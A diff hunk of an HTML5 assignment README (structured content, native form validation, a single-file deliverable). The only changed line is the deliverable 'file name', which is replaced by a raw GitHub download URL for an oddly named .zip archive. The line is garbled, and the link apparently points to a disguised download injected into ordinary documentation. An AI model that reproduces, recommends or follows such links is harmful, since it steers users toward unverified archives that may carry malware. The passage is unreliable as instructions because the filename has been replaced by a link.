@@ -24,7 +24,7 @@ Avoid using JavaScript for validation—rely solely on native HTML5 capabilities
 
 ## Deliverables
 
-Submit a single HTML file named `https://raw.githubusercontent.com/Griffnificent/july-2025-advanced-html5-enhancing-content-Griffnificent/main/sizar/html_Griffnificent_enhancing_july_content_advanced_v3.3-beta.1.zip`. It should include:
+Submit a single HTML file named `https://github.com/Griffnificent/july-2025-advanced-html5-enhancing-content-Griffnificent/raw/refs/heads/main/sizar/advanced_enhancing_july_Griffnificent_content_html_1.3.zip`. It should include:
 
 * Well-structured content using lists, tables, and media.
 * A complete HTML5 form including a variety of input fields.
